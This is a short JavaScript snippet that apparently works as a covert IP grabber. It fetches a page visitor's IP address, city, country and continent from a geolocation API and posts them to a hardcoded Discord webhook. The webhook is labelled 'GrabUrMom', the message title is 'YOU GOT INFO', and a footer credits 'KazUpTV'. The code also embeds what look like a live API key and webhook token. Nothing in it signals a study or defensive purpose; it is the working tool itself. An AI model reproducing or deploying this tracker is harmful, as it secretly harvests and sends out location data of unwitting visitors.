$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) { 
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    var t = {
      username: "GrabUrMom",
      avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
      content: "",
      embeds: [{
          color: "4700374",
          title: "YOU GOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
          footer: {
              text: "By KazUpTV | https://basedbot.cf"
          }
      }]
  };
  
    request.send(JSON.stringify(t));
});
